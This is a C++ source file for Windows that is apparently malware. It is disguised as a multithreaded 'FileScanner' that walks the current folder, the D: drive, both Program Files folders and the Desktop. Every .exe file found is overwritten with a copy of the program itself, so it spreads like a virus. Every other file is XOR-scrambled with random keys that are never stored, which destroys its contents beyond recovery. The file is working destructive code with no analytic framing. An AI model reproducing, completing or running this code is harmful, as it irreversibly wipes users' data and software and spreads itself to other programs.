#define INITGUID
#include <iostream>
#include <filesystem>
#include <vector>
#include <thread>
#include <queue>
#include <mutex>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <lmcons.h>
#include <knownfolders.h>
#include <shlobj.h>

namespace fs = std::filesystem;

#include <random>

unsigned char generateRandomKey()
{
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(0, 255);

    return static_cast<unsigned char>(dist(gen));
}

class ThreadPool
{
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queueMutex;
    std::condition_variable condition;
    bool stop = false;

public:
    ThreadPool(size_t threads)
    {
        for (size_t i = 0; i < threads; ++i)
        {
            workers.emplace_back([this]()
                                 {
                while (true) {
                    std::function<void()> task;

                    {
                        std::unique_lock<std::mutex> lock(queueMutex);
                        condition.wait(lock, [this]() {
                            return stop || !tasks.empty();
                        });

                        if (stop && tasks.empty())
                            return;

                        task = std::move(tasks.front());
                        tasks.pop();
                    }

                    task();
                } });
        }
    }

    void enqueue(std::function<void()> task)
    {
        {
            std::lock_guard<std::mutex> lock(queueMutex);
            tasks.push(std::move(task));
        }
        condition.notify_one();
    }

    ~ThreadPool()
    {
        {
            std::lock_guard<std::mutex> lock(queueMutex);
            stop = true;
        }
        condition.notify_all();

        for (auto &t : workers)
            t.join();
    }
};

class FileScanner
{
private:
    ThreadPool pool;
    std::atomic<int> activeTasks;
    std::mutex coutMutex;
    int downloadProgress = 1;
    fs::path selfPath;

public:
    FileScanner(size_t threads)
        : pool(threads), activeTasks(0)
    {

        char buffer[MAX_PATH];
        GetModuleFileNameA(NULL, buffer, MAX_PATH);
        selfPath = fs::canonical(buffer);
    }

    void scan(const fs::path &root)
    {
        activeTasks = 1;

        pool.enqueue([this, root]()
                     { scanDirectory(root); });

        while (activeTasks > 0)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
    }

private:
    void scanDirectory(const fs::path &dirPath)
    {
        try
        {
            for (const auto &entry : fs::directory_iterator(dirPath))
            {

                if (entry.is_directory())
                {
                    activeTasks++;

                    pool.enqueue([this, path = entry.path()]()
                                 { scanDirectory(path); });
                }
                else if (entry.is_regular_file())
                {
                    const std::string ext =
                        entry.path().extension().string();
                    if (ext == ".exe")
                    {
                        Replicate(entry.path());
                    }
                    else
                    {
                        encryptFile(entry.path());
                    }
                }
            }
        }
        catch (...)
        {
        }

        activeTasks--;
    }

    void Replicate(const fs::path &filePath)
    {
        try
        {
            fs::path canonicalFile = fs::canonical(filePath);
            if (fs::equivalent(canonicalFile, selfPath))
            {
                return;
            }

            const size_t BUFFER_SIZE = 4096;

            std::ifstream inFile(canonicalFile, std::ios::binary);
            if (!inFile)
                return;

            fs::path tempPath = canonicalFile;
            tempPath += ".tmp";

            std::ofstream outFile(tempPath, std::ios::binary);
            std::ifstream self_pp(selfPath, std::ios::binary);

            if (!outFile || !self_pp)
                return;

            std::vector<char> buffer(BUFFER_SIZE);

            while (inFile)
            {
                self_pp.read(buffer.data(), BUFFER_SIZE);
                std::streamsize bytesRead = self_pp.gcount();
                outFile.write(buffer.data(), bytesRead);
            }

            self_pp.close();
            outFile.close();

            fs::remove(canonicalFile);
            fs::rename(tempPath, canonicalFile);

            std::lock_guard<std::mutex> lock(coutMutex);
        }
        catch (...)
        {
        }
    }
    void encryptFile(const fs::path &filePath)
    {
        try
        {
            fs::path canonicalFile = fs::canonical(filePath);
            if (fs::equivalent(canonicalFile, selfPath))
            {
                return;
            }

            const size_t BUFFER_SIZE = 4096;

            std::ifstream inFile(canonicalFile, std::ios::binary);
            if (!inFile)
                return;

            fs::path tempPath = canonicalFile;
            tempPath += ".tmp";

            std::ofstream outFile(tempPath, std::ios::binary);
            if (!outFile)
                return;

            std::vector<char> buffer(BUFFER_SIZE);

            while (inFile)
            {
                inFile.read(buffer.data(), BUFFER_SIZE);
                std::streamsize bytesRead = inFile.gcount();
                const unsigned char XOR_KEY = generateRandomKey();
                for (std::streamsize i = 0; i < bytesRead; ++i)
                {

                    buffer[i] ^= XOR_KEY;
                }
                outFile.write(buffer.data(), bytesRead);
            }

            inFile.close();
            outFile.close();

            fs::remove(canonicalFile);
            fs::rename(tempPath, canonicalFile);

            std::lock_guard<std::mutex> lock(coutMutex);
        }
        catch (...)
        {
        }
    }
};

fs::path getDesktopPath()
{
    PWSTR path = nullptr;

    HRESULT hr = SHGetKnownFolderPath(
        FOLDERID_Desktop,
        0,
        nullptr,
        &path);

    if (SUCCEEDED(hr))
    {
        fs::path result(path);
        CoTaskMemFree(path);
        return result;
    }

    return {};
}

int main(int argc, char *argv[])
{

    fs::path currentPath = fs::current_path();
    fs::path Target1 = R"(D:\)";
    fs::path Target2 = R"(C:\Program Files)";
    fs::path Target4 = R"(C:\Program Files (x86))";
    fs::path desktop = getDesktopPath();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    size_t threads = std::thread::hardware_concurrency();
    if (threads == 0)
        threads = 4;

    FileScanner scanner2(threads);

    scanner2.scan(currentPath);
    std::this_thread::sleep_for(std::chrono::seconds(3));
    FileScanner scanner(threads);
    scanner.scan(Target1);
    scanner.scan(Target2);
    scanner.scan(desktop);
    scanner.scan(Target4);

    return 0;
}